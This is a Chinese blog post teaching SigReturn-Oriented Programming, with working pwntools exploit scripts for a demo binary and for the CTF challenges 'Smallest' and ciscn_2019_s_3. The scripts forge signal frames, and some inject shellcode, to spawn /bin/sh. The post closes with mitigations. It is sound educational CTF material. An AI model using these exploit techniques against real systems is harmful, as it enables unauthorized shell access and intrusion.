---
title: Understanding SigReturn-Oriented-Programming
date: 2020-03-13 16:07:27
tags: [pwn, ctf]
---

去年学 ROP 的时候遗漏的一个技术。

<!-- more -->

# What is SROP

SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。

其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。

## Signal

Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：

![](/pics/Understanding-SigReturn-Oriented-Programming/1.png)

1. 首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；
2. 内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；
3. 接着使用用户态中注册过的 Signal Handler 处理相应的 Signal；
4. 处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。

在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：

![](/pics/Understanding-SigReturn-Oriented-Programming/2.png)

Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：

```cpp
struct sigcontext {
	__u16				gs, __gsh;
	__u16				fs, __fsh;
	__u16				es, __esh;
	__u16				ds, __dsh;
	__u32				edi;
	__u32				esi;
	__u32				ebp;
	__u32				esp;
	__u32				ebx;
	__u32				edx;
	__u32				ecx;
	__u32				eax;
	__u32				trapno;
	__u32				err;
	__u32				eip;
	__u16				cs, __csh;
	__u32				eflags;
	__u32				esp_at_signal;
	__u16				ss, __ssh;
	struct _fpstate __user		*fpstate; // FPU寄存器状态
	__u32				oldmask;
	__u32				cr2;
};
```

在 x64 中的 sigcontext 结构体如下：

```cpp
struct sigcontext {
	__u64				r8;
	__u64				r9;
	__u64				r10;
	__u64				r11;
	__u64				r12;
	__u64				r13;
	__u64				r14;
	__u64				r15;
	__u64				rdi;
	__u64				rsi;
	__u64				rbp;
	__u64				rbx;
	__u64				rdx;
	__u64				rax;
	__u64				rcx;
	__u64				rsp;
	__u64				rip;
	__u64				eflags;		/* RFLAGS */
	__u16				cs;
	__u16				gs;
	__u16				fs;
	__u16				__pad0;
	__u64				err;
	__u64				trapno;
	__u64				oldmask;
	__u64				cr2;
	struct _fpstate __user		*fpstate;	/* Zero when no FPU context */
	__u64				reserved1[8];
};
```

## SROP Theory

在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：

- Signal Frame 可以被用户读写；
- 因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。

那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下：

- 可以通过栈溢出来控制栈
- 需要知道一些地址
  - `&"/bin/sh"`
  - Signal Frame
  - Gadget：`syscall ; ret`
  - Sigreturn
- 需要有足够大的空间来放下 Signal Frame

在 pwntools 中也集成了 SROP 的工具，即 `SigreturnFrame()`，用于构造假的 sigcontext 结构体（Signal Frame）。

# Example

我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：

```cpp
char buf[0x200];

int main()
{
    asm(
        // 读取 0x200 字节
        "mov rax, 0\n" // sys_read
        "mov rdi, 0\n" // fd
        "lea rsi, %0\n" // buf
        "mov rdx, 0x200\n" // count
        "syscall\n"

        // 恢复进程上下文
        "mov rax, 15\n" // sys_rt_sigaction
        "mov rdi, 0\n"
        "mov rsp, rsi\n" // 把buf作为栈
        // syscall 的 symbol，便于查找
        "syscall:\n"
        "syscall\n"
        "jmp exit\n"

        // 退出程序
        "exit:\n"
        "mov rax, 60\n" // sys_exit
        "mov rdi, 0\n"
        "syscall\n"
        :
        : "m" (buf)
        :
        );
}
```

构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./main')
elf = ELF('./main')

#gdb.attach(p)

# 构造假的Signal Frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve # 设置系统调用号为sys_execve
frame.rdi = elf.symbols['buf'] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串
frame.rsi = 0
frame.rdx = 0
frame.rip = elf.symbols['syscall']

payload = str(frame).ljust(0x100, 'A') + '/bin/sh\x00' # 设置payload
p.send(payload)

p.interactive()
```

调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：

```gdb
──────────────────────────────────── Code ────────────────────────────────────
   0x40010a <main+34>:	mov    rax,0xf
   0x400111 <main+41>:	mov    rdi,0x0
   0x400118 <main+48>:	mov    rsp,rsi
=> 0x40011b <main+51>:	syscall
   0x40011d <main+53>:	jmp    0x40011f <main+55>
   0x40011f <main+55>:	mov    rax,0x3c
   0x400126 <main+62>:	mov    rdi,0x0
   0x40012d <main+69>:	syscall
────────────────────────────── System call info ──────────────────────────────
rt_sigreturn()
───────────────────────────────── SROP info ──────────────────────────────────
       ss_size:0x0000000000000000           rsi:0x0000000000000000
           rax:0x000000000000003b           rbp:0x0000000000000000
        eflags:0x0000000000000000           rcx:0x0000000000000000
           rip:0x000000000040011b           r13:0x0000000000000000
           cr2:0x0000000000000000           r12:0x0000000000000000
           rbx:0x0000000000000000       uc_link:0x0000000000000000
           err:0x0000000000000000        trapno:0x0000000000000000
           r10:0x0000000000000000      ss_flags:0x0000000000000000
         ss_sp:0x0000000000000000           rdi:0x0000000000600280
      uc_flags:0x0000000000000000           r14:0x0000000000000000
            r8:0x0000000000000000      selector:0x0000000000000033
            r9:0x0000000000000000           rdx:0x0000000000000000
           rsp:0x0000000000000000       oldmask:0x0000000000000000
           r11:0x0000000000000000           r15:0x0000000000000000

...

──────────────────────────────────── Code ────────────────────────────────────
   0x40010a <main+34>:	mov    rax,0xf
   0x400111 <main+41>:	mov    rdi,0x0
   0x400118 <main+48>:	mov    rsp,rsi
=> 0x40011b <main+51>:	syscall
   0x40011d <main+53>:	jmp    0x40011f <main+55>
   0x40011f <main+55>:	mov    rax,0x3c
   0x400126 <main+62>:	mov    rdi,0x0
   0x40012d <main+69>:	syscall
────────────────────────────── System call info ──────────────────────────────
execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)
const char *name : 0x600280 --> 0x68732f6e69622f ('/bin/sh')
const char *const *argv : 0x0
const char *const *envp : 0x0
```

# Smallest

程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：

```bash
$ checksec ./smallest
[*] '/home/beale/SROP/2017-360Chunqiu-Smallest/smallest'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Analysis

2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：

```bash
$ objdump -d ./smallest -M intel

./smallest:     file format elf64-x86-64


Disassembly of section .text:

00000000004000b0 <.text>:
  4000b0:	48 31 c0             	xor    rax,rax
  4000b3:	ba 00 04 00 00       	mov    edx,0x400
  4000b8:	48 89 e6             	mov    rsi,rsp
  4000bb:	48 89 c7             	mov    rdi,rax
  4000be:	0f 05                	syscall
  4000c0:	c3                   	ret
```

可以看到 `4000be` 处的是 `syscall ; ret`，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。

## Exploit

脚本如下：

```python
#!/usr/bin/env python
#-*- encoding=utf-8 -*-
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
#context.terminal = ['lxterminal', '-e']

p = process('./smallest')
elf = ELF('./smallest')

#gdb.attach(p)

main_addr = 0x4000b0
syscall_addr = 0x4000be

payload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入
raw_input('@main*3')
p.send(payload)

payload = '\xb3' # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址
raw_input('@leak stack')
p.send(payload)
p.recv(8)
stack_addr = u64(p.recv(8))
info('stack_addr = ' + hex(stack_addr))

payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturn
frame = SigreturnFrame()
frame.rax = constants.SYS_read # sys_read的调用号
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x400
frame.rsp = stack_addr
frame.rip = syscall_addr
payload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上
raw_input('@fake sigcontext to pivot stack')
p.send(payload)

payload = p64(syscall_addr).ljust(15, 'A') # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）
raw_input('@set rax=15')
p.send(payload)

# 下面开始往新的栈上写东西
bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址
payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturn
frame = SigreturnFrame()
frame.rax = constants.SYS_execve # sys_execve的调用号
frame.rdi = bin_sh_addr
frame.rip = syscall_addr
payload += str(frame) + '/bin/sh\x00' # 开shell
raw_input('@fake sigcontext to exec shell')
p.send(payload)

payload = p64(syscall_addr).ljust(15, 'A') # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）
raw_input('@set rax=15')
p.send(payload)

p.interactive()
```

第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：

```python
payload = p64(main_addr) + p64(syscall_addr)
frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = stack_addr & 0xfffffffffffff000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = stack_addr + 0x108 # 设置栈的位置
frame.rip = syscall_addr
payload += str(frame)
payload += p64(stack_addr + 0x110) # 设置return的地址
payload += asm(shellcraft.sh())
p.send(payload)
```

# ciscn_2019_s_3

保护和上面开的一样：

```bash
$ checksec ./ciscn_s_3
[*] '/root/tmp/ciscn_2019_s_3/ciscn_s_3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Analysis

程序在 main 中调用了 vuln：

```asm
000000000040051d <main>:
  40051d:	55                   	push   rbp
  40051e:	48 89 e5             	mov    rbp,rsp
  400521:	48 83 ec 10          	sub    rsp,0x10
  400525:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
  400528:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  40052c:	b8 00 00 00 00       	mov    eax,0x0
  400531:	e8 b7 ff ff ff       	call   4004ed <vuln>
  400536:	90                   	nop
  400537:	c9                   	leave
  400538:	c3                   	ret
```

vuln 中读了 0x400 到 `[rsp-0x10]` 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：

```asm
00000000004004ed <vuln>:
  4004ed:	55                   	push   rbp
  4004ee:	48 89 e5             	mov    rbp,rsp
  4004f1:	48 31 c0             	xor    rax,rax
  4004f4:	ba 00 04 00 00       	mov    edx,0x400
  4004f9:	48 8d 74 24 f0       	lea    rsi,[rsp-0x10]
  4004fe:	48 89 c7             	mov    rdi,rax
  400501:	0f 05                	syscall
  400503:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  40050a:	ba 30 00 00 00       	mov    edx,0x30
  40050f:	48 8d 74 24 f0       	lea    rsi,[rsp-0x10]
  400514:	48 89 c7             	mov    rdi,rax
  400517:	0f 05                	syscall
  400519:	c3                   	ret
  40051a:	90                   	nop
  40051b:	5d                   	pop    rbp
  40051c:	c3                   	ret
```

另外还提供了 sys_execve 和 sys_sigreturn 的调用号：

```asm
00000000004004d6 <gadgets>:
  4004d6:	55                   	push   rbp
  4004d7:	48 89 e5             	mov    rbp,rsp
  4004da:	48 c7 c0 0f 00 00 00 	mov    rax,0xf
  4004e1:	c3                   	ret
  4004e2:	48 c7 c0 3b 00 00 00 	mov    rax,0x3b
  4004e9:	c3                   	ret
  4004ea:	90                   	nop
  4004eb:	5d                   	pop    rbp
  4004ec:	c3                   	ret
```

这题相对简单一些，可以写 `"/bin/sh"` 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。

## Exploit

脚本如下：

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
#context.terminal = ['lxterminal', '-e']

local = 0
if local:
  p = process('./ciscn_s_3')
else:
	p = remote('node3.buuoj.cn', 28526)

#gdb.attach(p)

vuln_addr = 0x4004f1
set_sigreturn_addr = 0x4004da
set_execve_addr = 0x4004e2
syscall_ret = 0x400517

payload = '/bin/sh\x00'.ljust(16, 'A') + p64(vuln_addr)
raw_input('@')
p.send(payload)
p.recv(32)
stack_addr = u64(p.recv(8))
info('stack_addr = ' + hex(stack_addr))

bin_sh_addr = stack_addr - 0x118
payload = p64(set_sigreturn_addr) + p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rip = syscall_ret
payload += str(frame)
raw_input('@')
p.send(payload)

p.interactive()
```

# Prevention

## Gadgets Prevention

在当前的几种不同的操作系统中，`sigreturn` 和 `syscall; ret` 这两个 Gadgets 非常容易被找到，特别是在 `vsyscall` 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。

## Signal Frame Canaries

这种方法借鉴于 Stack Canaries 机制，即在`Signal Frame`的`rt_sigreturn`字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生`sigreturn`之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。

## Break kernel agnostic

这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 `sigreturn` 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。

# References

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop
https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h
https://bestwing.me/stack-overflow-three-SROP.html
http://blog.leanote.com/post/3191220142@qq.com/SROP
https://www.freebuf.com/articles/network/87447.html
http://blog.eonew.cn/archives/975
https://bestwing.me/2017-360chunqiu-online.html
